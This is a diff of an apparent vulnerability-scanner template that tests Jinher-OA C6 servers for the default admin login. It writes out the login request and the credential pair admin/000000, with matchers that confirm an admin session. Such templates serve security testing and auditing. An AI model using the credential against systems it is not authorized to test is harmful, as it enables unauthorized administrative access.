@@ -1,10 +1,9 @@
 id: jinher-oa-default-login
-
 info:
-  name: Jinher-OA C6 - Default Login
+  name: Jinher-OA C6 - Default Admin Discovery
   author: ritikchaddha
   severity: high
-  description: Jinher-OA C6 default login credentials were discovered.
+  description: Jinher-OA C6 default admin credentials were discovered.
   reference:
     - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md
   classification:
@@ -13,39 +12,33 @@ info:
     cwe-id: CWE-522
   metadata:
     max-request: 1
-  tags: jinher,default-login,vuln
-
+  tags: default-login,jinher,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - ÏµÍ³¹ÜÀíÔ±|
+          - ÄúºÃ|||
+      - part: header
+        type: word
+        words:
+          - SessionIDAdmin=
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    payloads:
+      password:
+        - "000000"
+      username:
+        - admin
+    raw:
       - |
         POST /c6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         type=login&loginCode={{base64("{{username}}")}}&pwd={{base64("{{password}}")}}&
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - "000000"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "ÏµÍ³¹ÜÀíÔ±|"
-          - "ÄúºÃ|||"
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - "SessionIDAdmin="
-
-      - type: status
-        status:
-          - 200
-
